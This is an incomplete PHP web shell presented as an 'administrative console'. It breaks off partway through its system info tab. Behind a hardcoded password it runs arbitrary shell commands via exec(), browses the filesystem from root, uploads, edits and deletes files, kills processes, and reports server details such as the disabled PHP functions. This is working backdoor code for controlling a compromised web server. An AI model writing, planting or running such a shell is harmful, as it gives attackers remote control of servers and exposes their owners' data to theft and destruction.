<?php

if (session_status() == PHP_SESSION_NONE) {
    $temp_dir = sys_get_temp_dir();
    if (is_dir($temp_dir) && is_writable($temp_dir)) {
        session_save_path($temp_dir);
    }
    @session_start();
}

$password = 'admin123#@#';

// Handle Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['se_logged_in']);
    session_destroy();
    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}

// Handle Login Form Submission
$login_error = '';
if (isset($_POST['se_password'])) {
    if ($_POST['se_password'] === $password) {
        $_SESSION['se_logged_in'] = true;
        // Generate CSRF token if not exists
        if (empty($_SESSION['se_csrf_token'])) {
            $_SESSION['se_csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
        }
        header('Location: ' . $_SERVER['SCRIPT_NAME']);
        exit;
    } else {
        $login_error = "Incorrect password. Access denied.";
    }
}

if (!isset($_SESSION['se_logged_in']) || $_SESSION['se_logged_in'] !== true) {
    se_render_login_page($login_error);
    exit;
}

if (empty($_SESSION['se_csrf_token'])) {
    $_SESSION['se_csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
}

// === 2. HELPER FUNCTIONS ===
function se_esc_html($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

function se_esc_attr($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

function se_build_url($params = array()) {
    $current_params = $_GET;
    foreach ($params as $k => $v) {
        if ($v === null) {
            unset($current_params[$k]);
        } else {
            $current_params[$k] = $v;
        }
    }
    return $_SERVER['SCRIPT_NAME'] . '?' . http_build_query($current_params);
}

function se_verify_csrf($token) {
    return isset($_SESSION['se_csrf_token']) && hash_equals($_SESSION['se_csrf_token'], $token);
}

function se_get_current_path() {
    $current_path = __DIR__;
    if (isset($_GET['se_path']) && !empty($_GET['se_path'])) {
        $requested_path = urldecode($_GET['se_path']);
        $requested_path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $requested_path);
        $real_path = realpath($requested_path);
        if ($real_path && is_dir($real_path)) {
            $current_path = $real_path;
        }
    }
    return rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
}

// === 3. REQUEST PROCESSING ===
$current_path = se_get_current_path();

// A. Process File Download
if (isset($_GET['download_file']) && isset($_GET['csrf_token'])) {
    if (se_verify_csrf($_GET['csrf_token'])) {
        $file_to_dl = basename($_GET['download_file']);
        $target_dir = isset($_GET['se_path']) ? urldecode($_GET['se_path']) : __DIR__;
        $target_dir = realpath($target_dir);
        if ($target_dir && is_dir($target_dir)) {
            $full_dl_path = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_dl;
            if (file_exists($full_dl_path) && is_file($full_dl_path)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($full_dl_path) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($full_dl_path));
                readfile($full_dl_path);
                exit;
            }
        }
    } else {
        die('CSRF Security check failed for download.');
    }
}

// B. Process File Upload
if (isset($_FILES['se_file'])) {
    if (!isset($_POST['se_csrf_token']) || !se_verify_csrf($_POST['se_csrf_token'])) {
        die('CSRF Security check failed for upload.');
    }

    $target_dir = isset($_POST['se_upload_path']) ? urldecode($_POST['se_upload_path']) : __DIR__;
    $target_dir = realpath($target_dir);

    if ($target_dir && is_dir($target_dir)) {
        $target_dir = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
        if ($_FILES['se_file']['error'] === UPLOAD_ERR_OK) {
            $file_name = preg_replace('/[^a-zA-Z0-9-_\.]/', '', $_FILES['se_file']['name']);
            if (empty($file_name)) {
                $file_name = 'uploaded_file_' . time();
            }
            
            $target = $target_dir . $file_name;
            if (move_uploaded_file($_FILES['se_file']['tmp_name'], $target)) {
                header('Location: ' . se_build_url(array('status' => 'uploaded', 'fname' => urlencode($file_name), 'se_path' => urlencode($target_dir))));
                exit;
            } else {
                header('Location: ' . se_build_url(array('status' => 'upload_failed', 'se_path' => urlencode($target_dir))));
                exit;
            }
        }
    }
}

// C. Process File Deletion
if (isset($_GET['delete_file']) && isset($_GET['csrf_token'])) {
    $file_to_delete = basename($_GET['delete_file']);
    $target_dir = isset($_GET['se_path']) ? urldecode($_GET['se_path']) : __DIR__;
    $target_dir = realpath($target_dir);

    if ($target_dir && is_dir($target_dir)) {
        $target_dir = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
        if (se_verify_csrf($_GET['csrf_token'])) {
            $del_file = $target_dir . $file_to_delete;
            if (file_exists($del_file) && is_file($del_file)) {
                unlink($del_file);
                header('Location: ' . se_build_url(array('status' => 'deleted', 'fname' => urlencode($file_to_delete), 'se_path' => urlencode($target_dir), 'delete_file' => null, 'csrf_token' => null)));
                exit;
            }
        } else {
            die('CSRF Security check failed for deletion.');
        }
    }
}

// D. Process File Save (Code Editor)
if (isset($_POST['se_save_file_name']) && isset($_POST['se_csrf_token'])) {
    if (!se_verify_csrf($_POST['se_csrf_token'])) {
        die('CSRF Security check failed for file save.');
    }
    $file_to_save = basename($_POST['se_save_file_name']);
    $target_dir = isset($_POST['se_path']) ? urldecode($_POST['se_path']) : __DIR__;
    $target_dir = realpath($target_dir);
    if ($target_dir && is_dir($target_dir)) {
        $save_path = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_save;
        $content = $_POST['se_file_content'];
        file_put_contents($save_path, $content);
        header('Location: ' . se_build_url(array('status' => 'saved', 'fname' => urlencode($file_to_save), 'se_path' => urlencode($target_dir), 'edit_file' => null)));
        exit;
    }
}

// E. Process Create File / Directory
if (isset($_POST['se_create_type']) && isset($_POST['se_csrf_token'])) {
    if (!se_verify_csrf($_POST['se_csrf_token'])) {
        die('CSRF Security check failed for item creation.');
    }
    $item_name = trim($_POST['se_item_name']);
    $target_dir = isset($_POST['se_path']) ? urldecode($_POST['se_path']) : __DIR__;
    $target_dir = realpath($target_dir);
    if ($target_dir && is_dir($target_dir) && !empty($item_name)) {
        $new_item_path = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name;
        if ($_POST['se_create_type'] === 'file') {
            if (!file_exists($new_item_path)) {
                file_put_contents($new_item_path, '');
            }
        } elseif ($_POST['se_create_type'] === 'folder') {
            if (!file_exists($new_item_path)) {
                mkdir($new_item_path, 0755, true);
            }
        }
        header('Location: ' . se_build_url(array('status' => 'created', 'fname' => urlencode($item_name), 'se_path' => urlencode($target_dir))));
        exit;
    }
}

// F. Process Process Killing
if (isset($_GET['kill_pid']) && isset($_GET['csrf_token'])) {
    if (se_verify_csrf($_GET['csrf_token'])) {
        $pid = intval($_GET['kill_pid']);
        $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        if ($pid > 0) {
            if ($is_windows) {
                exec("taskkill /F /PID " . $pid);
            } else {
                exec("kill -9 " . $pid);
            }
        }
        header('Location: ' . se_build_url(array('tab' => 'processes', 'status' => 'killed', 'pid' => $pid, 'kill_pid' => null, 'csrf_token' => null)));
        exit;
    }
}

$tab = isset($_GET['tab']) ? $_GET['tab'] : 'shell';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cipher's Forge Pro Standalone</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0b0f19;
            --bg-secondary: #131a26;
            --bg-tertiary: #1b2436;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --accent-color: #3b82f6;
            --accent-gradient: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
            --danger-color: #ef4444;
            --danger-gradient: linear-gradient(135deg, #f43f5e 0%, #e11d48 100%);
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --border-color: #2e3b52;
            --font-outfit: 'Outfit', sans-serif;
            --font-mono: 'Fira Code', monospace;
        }

        body {
            font-family: var(--font-outfit);
            background-color: #05070c;
            color: var(--text-main);
            margin: 0;
            padding: 30px 15px;
            display: flex;
            justify-content: center;
        }

        .se-container {
            width: 100%;
            max-width: 1200px;
            background-color: var(--bg-primary);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
            border: 1px solid var(--border-color);
            position: relative;
            overflow: hidden;
        }

        .se-header {
            position: relative;
            z-index: 1;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 25px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 20px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .se-title {
            margin: 0;
            font-size: 26px;
            font-weight: 800;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .se-subtitle {
            font-size: 13px;
            color: var(--text-muted);
            margin: 5px 0 0 0;
        }

        .se-logout-btn {
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.2);
            padding: 8px 16px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .se-logout-btn:hover {
            background: #ef4444;
            color: white;
            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.2);
        }

        .se-nav-tabs {
            display: flex;
            gap: 8px;
            margin: 0 0 25px 0;
            background: var(--bg-secondary);
            padding: 6px;
            border-radius: 10px;
            width: fit-content;
            border: 1px solid var(--border-color);
            flex-wrap: wrap;
        }

        .se-tab-link {
            text-decoration: none;
            color: var(--text-muted);
            padding: 8px 16px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .se-tab-link:hover {
            color: var(--text-main);
            background: rgba(255, 255, 255, 0.05);
        }

        .se-tab-link.active {
            color: #ffffff;
            background: var(--accent-gradient);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .se-breadcrumbs {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            background: var(--bg-secondary);
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
            font-family: var(--font-mono);
            font-size: 13px;
        }

        .se-crumb-link {
            color: var(--accent-color);
            text-decoration: none;
            font-weight: 600;
        }

        .se-crumb-link:hover {
            color: #60a5fa;
            text-decoration: underline;
        }

        .se-crumb-separator {
            color: var(--text-muted);
        }

        .se-form-group {
            margin-bottom: 20px;
        }

        .se-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--text-main);
        }

        .se-input-row {
            display: flex;
            gap: 12px;
        }

        .se-input-text {
            flex-grow: 1;
            background: var(--bg-secondary) !important;
            border: 1px solid var(--border-color) !important;
            border-radius: 8px !important;
            color: var(--text-main) !important;
            padding: 10px 14px !important;
            font-family: var(--font-mono) !important;
            font-size: 14px !important;
        }

        .se-input-text:focus {
            border-color: var(--accent-color) !important;
            outline: none !important;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2) !important;
        }

        .se-btn {
            background: var(--accent-gradient);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            text-decoration: none !important;
        }

        .se-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
            color: #fff;
        }

        .se-btn-sec {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-main);
        }

        .se-btn-sec:hover {
            background: var(--border-color);
        }

        .se-btn-danger {
            background: var(--danger-gradient);
            color: white;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            text-decoration: none !important;
            border: none;
            cursor: pointer;
        }

        .se-btn-sm {
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 6px;
        }

        .se-console-wrapper {
            margin-top: 25px;
        }

        .se-console-header {
            background: var(--bg-tertiary);
            padding: 10px 16px;
            border-radius: 12px 12px 0 0;
            border: 1px solid var(--border-color);
            border-bottom: none;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .se-console-dots {
            display: flex;
            gap: 6px;
        }

        .se-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .se-dot-red { background: #ff5f56; }
        .se-dot-yellow { background: #ffbd2e; }
        .se-dot-green { background: #27c93f; }

        .se-console {
            background: #060913;
            color: #a7f3d0;
            padding: 20px;
            border-radius: 0 0 12px 12px;
            border: 1px solid var(--border-color);
            overflow-x: auto;
            font-family: var(--font-mono);
            font-size: 13px;
            line-height: 1.6;
            max-height: 450px;
            white-space: pre-wrap;
        }

        .se-editor-textarea {
            width: 100%;
            height: 450px;
            background: #060913;
            color: #67e8f9;
            font-family: var(--font-mono);
            font-size: 14px;
            padding: 15px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            box-sizing: border-border-box;
            resize: vertical;
            line-height: 1.5;
        }

        .se-editor-textarea:focus {
            outline: none;
            border-color: var(--accent-color);
        }

        .se-table-container {
            background: var(--bg-secondary);
            border-radius: 12px;
            border: 1px solid var(--border-color);
            overflow-x: auto;
            margin-top: 20px;
        }

        .se-table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        .se-table th, .se-table td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
            font-size: 13px;
        }

        .se-table th {
            background: var(--bg-tertiary);
            color: var(--text-main);
            font-weight: 600;
        }

        .se-table tr:hover td {
            background: rgba(255, 255, 255, 0.015);
        }

        .se-table td {
            color: var(--text-muted);
        }

        .se-item-link {
            text-decoration: none;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .se-item-link-dir { color: #fbbf24; }
        .se-item-link-dir:hover { color: #f59e0b; text-decoration: underline; }
        .se-item-link-file { color: var(--accent-color); }
        .se-item-link-file:hover { color: #60a5fa; text-decoration: underline; }

        .se-notice {
            padding: 14px 18px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .se-notice-success {
            background: rgba(16, 185, 129, 0.1);
            color: #34d399;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }

        .se-notice-error {
            background: rgba(239, 68, 68, 0.1);
            color: #f87171;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .se-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }

        .se-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
        }

        .se-card-title {
            font-size: 15px;
            font-weight: 700;
            color: var(--accent-color);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .se-card-row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            border-bottom: 1px dashed var(--border-color);
            font-size: 13px;
        }

        .se-card-row:last-child {
            border-bottom: none;
        }

        .se-meta-footer {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 20px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .action-group {
            display: flex;
            gap: 6px;
            justify-content: flex-end;
        }
    </style>
</head>
<body>

    <div class="se-container">
        <div class="se-header">
            <div>
                <h1 class="se-title">🛡️ Cipher's Forge Pro</h1>
                <p class="se-subtitle">Advanced Administrative Console — Shell, Editor, DB & Systems</p>
            </div>
            <a href="?action=logout" class="se-logout-btn">🔒 Logout</a>
        </div>

        <nav class="se-nav-tabs">
            <a href="<?php echo se_build_url(array('tab' => 'shell')); ?>" class="se-tab-link <?php echo $tab === 'shell' ? 'active' : ''; ?>">
                💻 Shell Terminal
            </a>
            <a href="<?php echo se_build_url(array('tab' => 'upload')); ?>" class="se-tab-link <?php echo $tab === 'upload' ? 'active' : ''; ?>">
                📂 File Explorer & Editor
            </a>
            <a href="<?php echo se_build_url(array('tab' => 'sysinfo')); ?>" class="se-tab-link <?php echo $tab === 'sysinfo' ? 'active' : ''; ?>">
                📊 System Info
            </a>
            <a href="<?php echo se_build_url(array('tab' => 'db')); ?>" class="se-tab-link <?php echo $tab === 'db' ? 'active' : ''; ?>">
                🗄️ Database Manager
            </a>
            <a href="<?php echo se_build_url(array('tab' => 'processes')); ?>" class="se-tab-link <?php echo $tab === 'processes' ? 'active' : ''; ?>">
                ⚡ Process Manager
            </a>
        </nav>

        <?php if ($tab === 'shell' || $tab === 'upload'): ?>
        <div class="se-breadcrumbs">
            <span style="color: var(--text-muted); margin-right: 5px;">📍 Location:</span>
            <?php
            $normalized_path = str_replace('\\', '/', $current_path);
            $parts = array_filter(explode('/', $normalized_path));
            $accumulated = '';
            $is_windows = (DIRECTORY_SEPARATOR === '\\');
            
            if (!$is_windows) {
                echo '<a href="' . se_build_url(array('se_path' => urlencode('/'))) . '" class="se-crumb-link">Root</a>';
                $accumulated = '';
            }

            $count = 0;
            foreach ($parts as $part) {
                if ($is_windows && $count === 0) {
                    $accumulated = $part;
                } else {
                    $accumulated .= DIRECTORY_SEPARATOR . $part;
                }
                
                if (!$is_windows || $count > 0) {
                    echo '<span class="se-crumb-separator">/</span>';
                }
                
                echo '<a href="' . se_build_url(array('se_path' => urlencode($accumulated . DIRECTORY_SEPARATOR))) . '" class="se-crumb-link">' . se_esc_html($part) . '</a>';
                $count++;
            }
            ?>
        </div>
        <?php endif; ?>

        <div class="se-content">
            <?php
            if ($tab === 'shell') {
                se_render_shell_tab($current_path);
            } elseif ($tab === 'upload') {
                se_render_upload_tab($current_path);
            } elseif ($tab === 'sysinfo') {
                se_render_sysinfo_tab();
            } elseif ($tab === 'db') {
                se_render_db_tab();
            } elseif ($tab === 'processes') {
                se_render_processes_tab();
            }
            ?>
        </div>
    </div>

</body>
</html>
<?php
// === TAB RENDERERS ===

// 1. Shell Tab
function se_render_shell_tab($current_path) {
    $output = '';
    $command = '';

    if (isset($_POST['se_command']) && !empty($_POST['se_command'])) {
        if (!isset($_POST['se_csrf_token']) || !se_verify_csrf($_POST['se_csrf_token'])) {
            die('CSRF Security check failed.');
        }

        $command = $_POST['se_command'];
        $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        
        if ($is_windows) {
            $cd_prefix = 'cd /d ' . escapeshellarg($current_path);
        } else {
            $cd_prefix = 'cd ' . escapeshellarg($current_path);
        }
        
        $safe_command = $cd_prefix . ' && ' . $command;

        exec($safe_command . ' 2>&1', $output_array, $return_code);
        $output = implode("\n", $output_array);
        if ($return_code !== 0) {
            $output .= "\n[Process exited with non-zero code: " . $return_code . "]";
        }
    }
    ?>
    <form method="post" action="">
        <input type="hidden" name="se_csrf_token" value="<?php echo se_esc_attr($_SESSION['se_csrf_token']); ?>">
        <div class="se-form-group">
            <label for="se_command" class="se-label">Enter System Command (Executing in current location)</label>
            <div class="se-input-row">
                <input type="text" id="se_command" name="se_command" 
                       value="<?php echo se_esc_attr($command); ?>" 
                       class="se-input-text" 
                       placeholder="e.g., whoami or dir / ipconfig / ls -la" 
                       required autocomplete="off" />
                <button type="submit" class="se-btn">Run Command</button>
            </div>
        </div>
    </form>

    <?php if ($output !== ''): ?>
        <div class="se-console-wrapper">
            <div class="se-console-header">
                <div class="se-console-dots">
                    <span class="se-dot se-dot-red"></span>
                    <span class="se-dot se-dot-yellow"></span>
                    <span class="se-dot se-dot-green"></span>
                </div>
                <div class="se-console-title">Console Output</div>
                <div></div>
            </div>
            <pre class="se-console"><?php echo se_esc_html($output); ?></pre>
        </div>
    <?php endif; ?>
    <?php
}

// 2. Upload & File Explorer Tab
function se_render_upload_tab($current_path) {
    if (isset($_GET['status'])) {
        if ($_GET['status'] === 'uploaded' && isset($_GET['fname'])) {
            echo '<div class="se-notice se-notice-success">✅ File uploaded successfully: <strong>' . se_esc_html(urldecode($_GET['fname'])) . '</strong></div>';
        } elseif ($_GET['status'] === 'deleted' && isset($_GET['fname'])) {
            echo '<div class="se-notice se-notice-success">🗑️ File deleted: <strong>' . se_esc_html(urldecode($_GET['fname'])) . '</strong></div>';
        } elseif ($_GET['status'] === 'saved' && isset($_GET['fname'])) {
            echo '<div class="se-notice se-notice-success">💾 File saved successfully: <strong>' . se_esc_html(urldecode($_GET['fname'])) . '</strong></div>';
        } elseif ($_GET['status'] === 'created' && isset($_GET['fname'])) {
            echo '<div class="se-notice se-notice-success">✨ Item created successfully: <strong>' . se_esc_html(urldecode($_GET['fname'])) . '</strong></div>';
        } elseif ($_GET['status'] === 'upload_failed') {
            echo '<div class="se-notice se-notice-error">❌ Upload failed. Please check folder permissions.</div>';
        }
    }

    // Check if editing a file
    if (isset($_GET['edit_file'])) {
        $edit_fname = basename($_GET['edit_file']);
        $edit_path = $current_path . $edit_fname;
        if (file_exists($edit_path) && is_file($edit_path)) {
            $content = file_get_contents($edit_path);
            ?>
            <div style="margin-bottom: 20px;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <h2 style="font-size: 18px; margin: 0;">📝 Editing File: <code><?php echo se_esc_html($edit_fname); ?></code></h2>
                    <a href="<?php echo se_build_url(array('edit_file' => null)); ?>" class="se-btn se-btn-sec">❌ Cancel / Go Back</a>
                </div>
                <form method="post" action="">
                    <input type="hidden" name="se_csrf_token" value="<?php echo se_esc_attr($_SESSION['se_csrf_token']); ?>">
                    <input type="hidden" name="se_save_file_name" value="<?php echo se_esc_attr($edit_fname); ?>">
                    <input type="hidden" name="se_path" value="<?php echo se_esc_attr(urlencode($current_path)); ?>">
                    
                    <textarea name="se_file_content" class="se-editor-textarea"><?php echo se_esc_html($content); ?></textarea>
                    
                    <div style="margin-top: 15px; text-align: right;">
                        <button type="submit" class="se-btn">💾 Save Changes</button>
                    </div>
                </form>
            </div>
            <?php
            return;
        }
    }

    $dirs = array();
    $files = array();
    
    if (file_exists($current_path) && is_dir($current_path)) {
        $items = scandir($current_path);
        if ($items !== false) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }
                $item_path = $current_path . $item;
                if (is_dir($item_path)) {
                    $dirs[] = $item;
                } else {
                    $files[] = $item;
                }
            }
        }
    }
    
    natcasesort($dirs);
    natcasesort($files);
    
    $parent_path = dirname($current_path);
    $is_root = ($parent_path === $current_path || realpath($parent_path) === false);
    ?>

    <div style="display: flex; gap: 20px; margin-bottom: 25px; align-items: flex-start; justify-content: space-between; flex-wrap: wrap;">
        <div>
            <?php if (!$is_root): ?>
                <a href="<?php echo se_build_url(array('se_path' => urlencode($parent_path . DIRECTORY_SEPARATOR))); ?>" class="se-btn se-btn-sec">
                    ⬅️ Go Up (Parent Directory)
                </a>
            <?php else: ?>
                <span class="se-btn se-btn-sec" style="opacity: 0.5; cursor: not-allowed;">
                    ⬅️ Go Up (At System Root)
                </span>
            <?php endif; ?>
        </div>

        <!-- Create File / Folder -->
        <div style="background: var(--bg-secondary); border: 1px solid var(--border-color); padding: 12px 16px; border-radius: 10px; display: flex; gap: 10px; align-items: center;">
            <form method="post" action="" style="display: flex; gap: 8px; align-items: center;">
                <input type="hidden" name="se_csrf_token" value="<?php echo se_esc_attr($_SESSION['se_csrf_token']); ?>">
                <input type="hidden" name="se_path" value="<?php echo se_esc_attr(urlencode($current_path)); ?>">
                <select name="se_create_type" class="se-input-text" style="width: auto; padding: 6px 10px !important;">
                    <option value="file">📄 File</option>
                    <option value="folder">📁 Folder</option>
                </select>
                <input type="text" name="se_item_name" placeholder="Name..." required class="se-input-text" style="width: 140px; padding: 6px 10px !important;">
                <button type="submit" class="se-btn se-btn-sm">+ Create</button>
            </form>
        </div>
        
        <!-- File Upload Area -->
        <div style="width: 320px;">
            <form method="post" enctype="multipart/form-data" id="se_upload_form">
                <input type="hidden" name="se_csrf_token" value="<?php echo se_esc_attr($_SESSION['se_csrf_token']); ?>">
                <input type="hidden" name="se_upload_path" value="<?php echo se_esc_attr(urlencode($current_path)); ?>">
                
                <div class="se-btn" style="width: 100%; box-sizing: border-box; justify-content: center;" onclick="document.getElementById('se_file').click()">
                    📤 Upload File to Folder
                    <input type="file" id="se_file" name="se_file" style="display: none;" required onchange="document.getElementById('se_upload_form').submit()">
                </div>
            </form>
        </div>
    </div>

    <h2 style="font-size: 18px; font-weight: 700; margin-top: 10px; margin-bottom: 12px;">📂 Directory Contents</h2>
    
    <div class="se-table-container">
        <table class="se-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th style="text-align: right;">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($dirs) && empty($files)): ?>
                    <tr>
                        <td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">
                            Empty directory.
                        </td>
                    </tr>
                <?php else: ?>
                    <?php foreach ($dirs as $dir): 
                        $dir_path = $current_path . $dir . DIRECTORY_SEPARATOR;
                        $perms = substr(sprintf('%o', fileperms($current_path . $dir)), -4);
                    ?>
                    <tr>
                        <td>
                            <a href="<?php echo se_build_url(array('se_path' => urlencode($dir_path))); ?>" class="se-item-link se-item-link-dir">
                                📁 <?php echo se_esc_html($dir); ?>
                            </a>
                        </td>
                        <td>Folder</td>
                        <td>-</td>
                        <td><code><?php echo $perms; ?></code></td>
                        <td style="text-align: right;">
                            <span style="color: var(--text-muted); font-size: 12px; font-style: italic;">Browse folder</span>
                        </td>
                    </tr>
                    <?php endforeach; ?>

                    <?php foreach ($files as $file): 
                        $file_path = $current_path . $file;
                        $size = file_exists($file_path) ? filesize($file_path) : 0;
                        $size_str = $size > 1048576 ? round($size / 1048576, 2) . ' MB' : round($size / 1024, 2) . ' KB';
                        $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                    ?>
                    <tr>
                        <td>
                            <span style="font-weight: 500; display: inline-flex; align-items: center; gap: 8px;">
                                📄 <?php echo se_esc_html($file); ?>
                            </span>
                        </td>
                        <td>File</td>
                        <td><?php echo $size_str; ?></td>
                        <td><code><?php echo $perms; ?></code></td>
                        <td>
                            <div class="action-group">
                                <a href="<?php echo se_build_url(array('edit_file' => urlencode($file))); ?>" class="se-btn se-btn-sec se-btn-sm">
                                    📝 Edit
                                </a>
                                <a href="<?php echo se_build_url(array('download_file' => urlencode($file), 'csrf_token' => $_SESSION['se_csrf_token'])); ?>" class="se-btn se-btn-sec se-btn-sm">
                                    ⬇️ Download
                                </a>
                                <a href="<?php echo se_build_url(array('delete_file' => urlencode($file), 'csrf_token' => $_SESSION['se_csrf_token'])); ?>" 
                                   onclick="return confirm('Are you sure you want to permanently delete this file?')" 
                                   class="se-btn-danger">
                                    🗑️
                                </a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>

    <div class="se-meta-footer">
        📁 Current Absolute Directory: <code><?php echo se_esc_html($current_path); ?></code>
    </div>
    <?php
}

// 3. System Info Tab
function se_render_sysinfo_tab() {
    $os = PHP_OS;
    $uname = function_exists('php_uname') ? php_uname() : 'N/A';
    $php_ver = PHP_VERSION;
    $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
    $client_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'N/A';
    $server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A';
    $disabled_functions = ini_get('disable_functions') ? ini_get('disable_functions') : 'None';
    $max_upload = ini_get('upload_max_filesize');
    $max_post = ini_get('post_max_size');
    $memory_limit = ini_get('memory_limit');

    // Disk Space
    $disk_total = @disk_total_space(__DIR__);
    $disk_free = @disk_free_space(__DIR__);
    $disk_used = ($disk_total && $disk_free) ? ($disk_total - $disk_free) : 0;
    $disk_percent = $disk_total ? round(($disk_used / $disk_total) * 100, 2) : 0;

    $disk_total_gb = $disk_total ? round($disk_total / (1024*1024*1024), 2) . ' GB' : 'N/A';
    $disk_free_gb = $disk_free ? round($disk_free / (1024*1024*1024), 2) . ' GB' : 'N/A';
    ?>
    <div class="se-grid">
        <div class="se-card">
            <div class="se-card-title">💻 Operating System & Server</div>
            <div class="se-card-row"><span>OS:</span> <strong><?php echo se_esc_html($os); ?></strong></div>
            <div class="se-card-row"><span>Kernel:</span> <strong style="font-size: 11px; word-break: break-all;"><?php echo se_esc_html($uname); ?></strong></div>
            <div class="se-card-row"><span>Server IP:</span> <strong><code><?php echo se_esc_html($server_ip); ?></code></strong></div>
            <div class="se-card-row"><span>Your IP:</span> <strong><code><?php echo se_esc_html($client_ip); ?></code></strong></div>
            <div class="se-card-row"><span>Software:</span> <strong><?php echo se_esc_html($server_software); ?></strong></div>
        </div>

        <div class="se-card">
            <div class="se-card-title">⚙️ PHP Configuration</div>
            <div class="se-card-row"><span>PHP Version:</span> <strong><?php echo se_esc_html($php_ver); ?></strong></div>
            <div class="se-card-row"><span>Memory Limit:</span> <strong><?php echo se_esc_html($memory_limit); ?></strong></div>
            <div class="se-card-row"><span>Max Upload:</span> <strong><?php echo se_esc_html($max_upload); ?></strong></div>
